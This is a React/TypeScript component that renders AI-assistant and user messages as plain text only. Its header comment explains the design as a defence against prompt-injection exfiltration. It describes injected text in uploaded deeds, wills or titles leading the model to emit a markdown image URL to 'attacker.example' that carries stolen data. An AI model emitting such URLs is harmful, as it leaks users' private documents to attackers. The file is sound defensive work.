import type { ReactElement } from 'react';

/**
 * The only renderer model-authored text ever gets (M11).
 *
 * ===========================================================================
 * PLAIN TEXT, BY CONSTRUCTION — NOT BY FILTERING
 * ===========================================================================
 *
 * docs/03 §6d owed this constraint "in the same PR as the first pixel of
 * model-authored text": no autolinking, no remote images. The reason is
 * exfiltration rather than defacement. An attacker who gets text in front of
 * this assistant — through an uploaded deed, a scanned will, a document title
 * (docs/03 risk #6) — cannot reach a sink through the tool surface, because
 * every tool is read-only. The renderer WOULD be a sink: a model persuaded to
 * emit `![](https://attacker.example/?d=…)` turns the victim's own browser into
 * the outbound request, carrying whatever the payload talked the model into
 * putting in that URL.
 *
 * So this component builds text nodes and nothing else. There is no parser to
 * mis-configure, no allowlist to widen, no `dangerouslySetInnerHTML` anywhere in
 * the tree, and no dependency: React escapes the string, and a `![](…)` renders
 * as those literal characters. The control is the ABSENCE of a feature, which is
 * the only kind of control a hostile payload cannot argue with — the same reason
 * this repo hand-wrote the template renderer, the webhook verifier and the clamd
 * client rather than reaching for a library on an untrusted-input path.
 *
 * WHAT THIS COSTS, stated rather than hidden: a long answer renders as
 * paragraphs of prose with no lists, no emphasis and no headings. Formatting is
 * a later, reviewed change — and whoever makes it inherits the requirement,
 * because adding a parser here is adding a sink.
 *
 * THE USER'S OWN TEXT GOES THROUGH THE SAME COMPONENT. It is their own input and
 * carries no new risk, but having one renderer for both roles is what stops a
 * future edit from giving the assistant's half a richer path than the user's.
 *
 * Defence in depth lives one layer out: `next.config.ts` sends
 * `img-src 'self' data:` and `connect-src 'self'`, so the browser refuses a
 * remote image load even if something here regresses.
 */

export interface MessageTextProps {
  readonly text: string;
  /** Optional class for the wrapping element; never applied to the text itself. */
  readonly className?: string;
}

/**
 * Line breaks are preserved through CSS (`whitespace-pre-wrap`) rather than by
 * splitting the string into `<br />`-separated fragments. Same visible result,
 * one fewer place where the text is taken apart and reassembled — and the
 * rendered subtree stays a single text node, which is what the spec asserts.
 */
export function MessageText({ text, className }: MessageTextProps): ReactElement {
  return <p className={`whitespace-pre-wrap break-words ${className ?? ''}`.trim()}>{text}</p>;
}
